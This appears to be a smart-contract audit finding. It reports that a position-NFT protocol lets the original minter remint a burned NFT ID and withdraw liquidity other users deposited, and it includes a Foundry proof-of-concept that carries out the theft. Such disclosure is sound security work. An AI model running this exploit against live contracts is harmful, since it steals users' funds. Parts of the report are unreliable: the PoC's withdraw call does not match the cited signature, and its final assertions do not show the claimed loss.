## Title
Position Theft via NFT Reminting After Burn - Original Minter Can Steal Transferred Positions

## Summary
The protocol allows NFTs to be burned and reminted with the same ID by the original minter. Since liquidity positions are tied to NFT IDs (not NFT instances), an original minter can transfer an NFT with positions to another user, wait for them to burn it, then remint the same NFT ID to steal control of positions containing the victim's liquidity.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** The NFT system is designed to allow gas-efficient burning and reminting. The documentation states that "The same ID can be recreated by the original minter by reusing the salt" for flexibility.

**Actual Logic:** When combined with the position management system, this creates a critical vulnerability. Positions in the Core contract persist after NFT burns, and NFT ownership (not NFT instance identity) controls position access. The `authorizedForNft` modifier only checks current NFT ownership without verifying the NFT instance hasn't changed.

**Exploitation Path:**
1. **Alice mints NFT X**: Alice calls `mint(salt_S)` which generates deterministic ID via [2](#0-1) 
2. **Alice creates position**: Alice calls `deposit(id, poolKey, ...)` using the `authorizedForNft(id)` modifier [3](#0-2) 
3. **Position stored in Core**: Position data is persisted in Core storage at slot calculated by [4](#0-3)  using `(positionId, poolId, owner=Positions_contract_address)` as key
4. **Alice transfers NFT X to Bob**: Bob now owns NFT X and can manage the position
5. **Bob deposits more liquidity**: Bob calls `deposit(id, poolKey, ...)` adding his funds to the same position [5](#0-4) 
6. **Bob burns NFT X**: Bob calls `burn(id)` [6](#0-5)  - NFT is destroyed but position remains in Core
7. **Alice remints NFT X**: Alice calls `mint(salt_S)` again with the same salt, recreating identical NFT ID (only Alice can do this as original minter) [7](#0-6) 
8. **Alice steals Bob's liquidity**: Alice calls `withdraw(id, poolKey, ...)` which passes `authorizedForNft(id)` check [8](#0-7)  and withdraws the entire position including Bob's funds

**Security Property Broken:** Violates the "Withdrawal Availability" invariant - Bob's liquidity becomes permanently inaccessible to him while being accessible to Alice, effectively stealing his funds.

## Impact Explanation

- **Affected Assets**: All liquidity positions where the NFT has been transferred and subsequently burned. Includes both token0 and token1 from all pools.
- **Damage Severity**: Complete loss of victim's deposited liquidity. If Bob deposited 100 ETH worth of liquidity, Alice can steal all of it. The attack scales to any position value.
- **User Impact**: Any user who receives a transferred position NFT and burns it becomes vulnerable. This includes marketplace buyers, NFT recipients, and users managing positions for gas optimization.

## Likelihood Explanation

- **Attacker Profile**: Original NFT minter (could be any user who creates positions). No special privileges required.
- **Preconditions**: 
  1. Attacker mints NFT with deterministic salt
  2. Attacker transfers NFT to victim
  3. Victim deposits liquidity into the position
  4. Victim burns the NFT (for gas refund or assuming it closes the position)
- **Execution Complexity**: Simple two-transaction attack (transfer, then wait for burn, then remint). No complex timing or MEV needed.
- **Frequency**: Can be repeated for every NFT the attacker originally minted and transferred. Attacker can create multiple NFTs with different salts to exploit multiple victims.

## Recommendation

Implement one of these mitigations:

**Option 1 - Prevent Reminting with Same Salt:**
```solidity
// In src/base/BaseNonfungibleToken.sol, add mapping to track burned tokens

mapping(uint256 => bool) private _burned;

function mint(bytes32 salt) public payable returns (uint256 id) {
    id = saltToId(msg.sender, salt);
    // Prevent reminting previously burned NFTs with same ID
    if (_burned[id]) revert TokenWasBurned();
    _mint(msg.sender, id);
}

function burn(uint256 id) external payable authorizedForNft(id) {
    _burned[id] = true;
    _burn(id);
}
```

**Option 2 - Clear Positions on Burn:**
Add a hook in BasePositions to track and clear all positions when an NFT is burned (requires maintaining reverse mapping of NFT→positions).

**Option 3 - Version-Aware Position IDs:**
Include a version counter in the position ID calculation that increments on each remint, ensuring old positions cannot be accessed by reminted NFTs.

## Proof of Concept

```solidity
// File: test/Exploit_NFTRemintPositionTheft.t.sol
// Run with: forge test --match-test test_NFTRemintPositionTheft -vvv

pragma solidity ^0.8.31;

import {Test} from "forge-std/Test.sol";
import {FullTest} from "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";

contract Exploit_NFTRemintPositionTheft is FullTest {
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    bytes32 constant ATTACK_SALT = bytes32(uint256(0x1337));
    
    function setUp() public {
        // Fund both users
        deal(address(token0), alice, 1000e18);
        deal(address(token1), alice, 1000e18);
        deal(address(token0), bob, 1000e18);
        deal(address(token1), bob, 1000e18);
    }
    
    function test_NFTRemintPositionTheft() public {
        // Create pool
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, byteToCallPoints(0));
        
        // STEP 1: Alice mints NFT with deterministic salt
        vm.startPrank(alice);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        uint256 nftId = positions.mint(ATTACK_SALT);
        
        // STEP 2: Alice creates position with 100 tokens
        positions.deposit(nftId, poolKey, MIN_TICK, MAX_TICK, 100e18, 100e18, 0);
        vm.stopPrank();
        
        // STEP 3: Alice transfers NFT to Bob
        vm.prank(alice);
        positions.transferFrom(alice, bob, nftId);
        
        // STEP 4: Bob deposits more liquidity (500 tokens)
        vm.startPrank(bob);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        positions.deposit(nftId, poolKey, MIN_TICK, MAX_TICK, 500e18, 500e18, 0);
        
        // Record Bob's balance before burn
        uint256 bobToken0Before = token0.balanceOf(bob);
        uint256 bobToken1Before = token1.balanceOf(bob);
        
        // STEP 5: Bob burns NFT (thinking he's done or to save gas)
        positions.burn(nftId);
        vm.stopPrank();
        
        // STEP 6: Alice remints the SAME NFT ID using the same salt
        vm.prank(alice);
        uint256 remintedId = positions.mint(ATTACK_SALT);
        assertEq(remintedId, nftId, "Reminted ID should match original");
        
        // STEP 7: Alice withdraws ALL liquidity (including Bob's contribution)
        vm.startPrank(alice);
        (uint128 liquidity,,,,) = positions.getPositionFeesAndLiquidity(
            remintedId, poolKey, MIN_TICK, MAX_TICK
        );
        (uint128 amount0, uint128 amount1) = positions.withdraw(
            remintedId, poolKey, MIN_TICK, MAX_TICK, liquidity
        );
        vm.stopPrank();
        
        // VERIFY: Alice stole Bob's liquidity
        // Alice should get both her 100 and Bob's 500 tokens (minus fees)
        assertTrue(amount0 > 500e18, "Alice got more than her original deposit");
        assertTrue(amount1 > 500e18, "Alice got more than her original deposit");
        
        // Bob cannot recover his funds - NFT is gone and position is drained
        assertEq(token0.balanceOf(bob), bobToken0Before, "Bob lost his deposited tokens");
        assertEq(token1.balanceOf(bob), bobToken1Before, "Bob lost his deposited tokens");
    }
}
```

## Notes

The test case `test_burn_can_be_minted()` at [9](#0-8)  explicitly demonstrates that burned tokens can be reminted with identical IDs, confirming this behavior is known but its security implications with position management were not fully considered.

The vulnerability exploits the semantic gap between NFT instance identity and position control. The position ID calculation at [10](#0-9)  uses `bytes24(uint192(id))` which only depends on the NFT token ID number, not the NFT instance or ownership history.

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L92-102)
```text
    function saltToId(address minter, bytes32 salt) public view returns (uint256 result) {
        assembly ("memory-safe") {
            let free := mload(0x40)
            mstore(free, minter)
            mstore(add(free, 32), salt)
            mstore(add(free, 64), chainid())
            mstore(add(free, 96), address())

            result := keccak256(free, 128)
        }
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L119-135)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev The token ID is generated using saltToId(msg.sender, salt). This prevents the need
    ///      to store a counter of how many tokens were minted, as IDs are deterministic.
    ///      No fees are collected; any msg.value sent is ignored.
    function mint(bytes32 salt) public payable returns (uint256 id) {
        id = saltToId(msg.sender, salt);
        _mint(msg.sender, id);
    }

    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Can be used to refund some gas after the NFT is no longer needed.
    ///      The same ID can be recreated by the original minter by reusing the salt.
    ///      Only the token owner or approved addresses can burn the token.
    ///      No fees are collected; any msg.value sent is ignored.
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```

**File:** src/base/BasePositions.sol (L71-97)
```text
    function deposit(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) public payable authorizedForNft(id) returns (uint128 liquidity, uint128 amount0, uint128 amount1) {
        SqrtRatio sqrtRatio = CORE.poolState(poolKey.toPoolId()).sqrtRatio();

        liquidity =
            maxLiquidity(sqrtRatio, tickToSqrtRatio(tickLower), tickToSqrtRatio(tickUpper), maxAmount0, maxAmount1);

        if (liquidity < minLiquidity) {
            revert DepositFailedDueToSlippage(liquidity, minLiquidity);
        }

        if (liquidity > uint128(type(int128).max)) {
            revert DepositOverflow();
        }

        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_DEPOSIT, msg.sender, id, poolKey, tickLower, tickUpper, liquidity)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L120-133)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L245-246)
```text
                createPositionId({_salt: bytes24(uint192(id)), _tickLower: tickLower, _tickUpper: tickUpper}),
                int128(liquidity)
```

**File:** src/libraries/CoreStorageLayout.sol (L100-114)
```text
    function poolPositionsSlot(PoolId poolId, address owner, PositionId positionId)
        internal
        pure
        returns (StorageSlot firstSlot)
    {
        assembly ("memory-safe") {
            let free := mload(0x40)
            mstore(free, positionId)
            mstore(add(free, 0x20), poolId)
            mstore(add(free, 0x40), owner)
            mstore(0, keccak256(free, 0x60))
            mstore(32, 1)
            firstSlot := keccak256(0, 64)
        }
    }
```

**File:** test/Positions.t.sol (L421-426)
```text
    function test_burn_can_be_minted() public {
        uint256 id = positions.mint(bytes32(0));
        positions.burn(id);
        uint256 id2 = positions.mint(bytes32(0));
        assertEq(id, id2);
    }
```
